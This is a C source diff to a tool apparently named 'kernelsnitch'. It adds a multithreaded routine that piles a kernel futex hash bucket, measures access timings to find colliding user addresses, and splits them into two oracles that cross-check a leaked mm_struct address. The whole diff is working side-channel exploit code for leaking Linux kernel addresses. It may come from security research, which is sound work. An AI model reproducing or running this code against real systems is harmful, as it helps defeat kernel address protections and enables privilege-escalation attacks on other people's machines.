@@ -514,7 +514,8 @@ struct ks_par_ctx {
     size_t nworkers;
     size_t wanted;
     size_t threshold_mult;
-    atomic_size_t next_slot;   /* claims into ks->futex_addrs[1..wanted]   */
+    volatile size_t *sink;     /* worker output: sink[0..wanted-1] found addrs */
+    atomic_size_t next_slot;   /* claims into sink[0..wanted-1]              */
     atomic_int stop;           /* raised once `wanted` collisions are found */
 };
 
@@ -563,7 +564,7 @@ static void *__ks_par_worker(void *arg)
             atomic_store_explicit(&ctx->stop, 1, memory_order_relaxed);
             break;
         }
-        ks->futex_addrs[slot + 1] = futex_addr;
+        ctx->sink[slot] = futex_addr;
         if (slot + 1 == ctx->wanted)
             atomic_store_explicit(&ctx->stop, 1, memory_order_relaxed);
     }
@@ -682,6 +683,7 @@ void kernelsnitch_find_collisions_parallel(struct kernelsnitch_shared_state *ks)
     ctx.nworkers = nworkers;
     ctx.wanted = wanted;
     ctx.threshold_mult = KERNELSNITCH_THRESHOLD_MULT;
+    ctx.sink = &ks->futex_addrs[1];
     atomic_init(&ctx.next_slot, 0);
     atomic_init(&ctx.stop, 0);
 
@@ -725,6 +727,108 @@ void kernelsnitch_find_collisions_parallel(struct kernelsnitch_shared_state *ks)
                 (__t_pile1 - __t_pile0) / 1.0e6, (__t_scan1 - __t_pile1) / 1.0e6,
                 (__t_dec1 - __t_scan1) / 1.0e6);
     }
+}
+
+/****************************************************************************************************************/
+/* Single pile + single parallel scan feeding TWO independent oracles.                                        */
+/*                                                                                                            */
+/* Piles the target bucket once and scans once for 2*(collisions-1) colliding user addresses, then splits     */
+/* them into two disjoint subsets: the first half populates ks_a, the second half ks_b (both share the piled  */
+/* bucket address at index 0). Each oracle then bruteforces independently and both must resolve the same       */
+/* mm_struct, preserving the two-disjoint-collision-set cross-check that rejects a false candidate -- at the   */
+/* cost of ONE pile create/join and ONE scan instead of two. The only property traded versus two fully        */
+/* separate scans is measurement-noise independence (both subsets come from one sampling pass); the           */
+/* address-set disjointness that catches a wrong leak is kept.                                                 */
+/****************************************************************************************************************/
+void kernelsnitch_find_collisions_parallel_dual(
+    struct kernelsnitch_shared_state *ks_a,
+    struct kernelsnitch_shared_state *ks_b)
+{
+    ASSERT_pr((ks_a->state == KERNELSNITCH_INIT &&
+               ks_b->state == KERNELSNITCH_INIT), "wrong state\n");
+    ASSERT_pr((ks_a->collisions >= 2 && ks_a->collisions == ks_b->collisions),
+              "need matching collision counts >= 2\n");
+
+    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
+    if (ncpu < 1)
+        ncpu = 1;
+    size_t nworkers = (size_t)ncpu;
+    size_t wanted = ks_a->collisions - 1;
+    size_t total_wanted = 2 * wanted;
+
+    ks_a->confirmed_collisions = 0;
+    ks_b->confirmed_collisions = 0;
+    ks_a->collision_min_time = (size_t)-1;
+    ks_b->collision_min_time = (size_t)-1;
+
+    size_t *sink = (size_t *)calloc(total_wanted, sizeof(size_t));
+    ASSERT_pr((sink != NULL), "failed to allocate dual collision sink\n");
+
+    /* One pile on ks_a's bucket; the scan runs over ks_a's futex region. */
+    struct ks_pile pile = {0};
+    ks_a->futex_addrs[0] = (size_t)&ks_a->inc_futex[ID];
+    __increase_fast(ks_a, ID, ks_a->appended_futexes, &pile);
+    if (ks_a->verbose)
+        pr_info("start finding collisisons (parallel dual, %zd workers)\n", nworkers);
+
+    struct ks_par_ctx ctx;
+    ctx.ks = ks_a;
+    ctx.nworkers = nworkers;
+    ctx.wanted = total_wanted;
+    ctx.threshold_mult = KERNELSNITCH_THRESHOLD_MULT;
+    ctx.sink = sink;
+    atomic_init(&ctx.next_slot, 0);
+    atomic_init(&ctx.stop, 0);
+
+    pthread_t *wt = (pthread_t *)calloc(nworkers, sizeof(*wt));
+    struct ks_par_worker *wa = (struct ks_par_worker *)calloc(nworkers, sizeof(*wa));
+    ASSERT_pr((wt != NULL && wa != NULL), "failed to allocate parallel workers\n");
+    for (size_t i = 0; i < nworkers; ++i) {
+        wa[i].ctx = &ctx;
+        wa[i].id = i;
+        wa[i].cpu = (int)(i % nworkers);
+        SYSCHK(pthread_create(&wt[i], NULL, __ks_par_worker, &wa[i]));
+    }
+    for (size_t i = 0; i < nworkers; ++i)
+        pthread_join(wt[i], NULL);
+    free(wt);
+    free(wa);
+
+    size_t count = atomic_load(&ctx.next_slot);
+    if (count > total_wanted)
+        count = total_wanted;
+
+    if (count == total_wanted) {
+        /* Split into two disjoint subsets; both share the piled bucket addr. */
+        ks_b->futex_addrs[0] = ks_a->futex_addrs[0];
+        for (size_t i = 0; i < wanted; ++i) {
+            ks_a->futex_addrs[i + 1] = sink[i];
+            ks_b->futex_addrs[i + 1] = sink[wanted + i];
+        }
+        /* Confirm the min traversal cost of each address while the bucket is
+         * still piled (matches the single-oracle path's timing capture). */
+        for (size_t i = 1; i <= wanted; ++i) {
+            size_t ma = __measure_min(ks_a->futex_addrs[i], KS_PAR_CONFIRM_SAMPLES);
+            if (ma < ks_a->collision_min_time)
+                ks_a->collision_min_time = ma;
+            size_t mb = __measure_min(ks_b->futex_addrs[i], KS_PAR_CONFIRM_SAMPLES);
+            if (mb < ks_b->collision_min_time)
+                ks_b->collision_min_time = mb;
+        }
+        ks_a->confirmed_collisions = wanted;
+        ks_b->confirmed_collisions = wanted;
+        ks_a->state = KERNELSNITCH_COLLISIONS_FOUND;
+        ks_b->state = KERNELSNITCH_COLLISIONS_FOUND;
+        if (ks_a->verbose)
+            pr_info("found %zd+%zd collisisons (dual)\n", wanted, wanted);
+    } else {
+        pr_warning("dual scan only found %zd/%zd collisions -> cannot continue\n",
+                   count, total_wanted);
+        ks_a->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+        ks_b->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+    }
+    __decrease_fast(ks_a, &pile);
+    free(sink);
 }
 
 size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
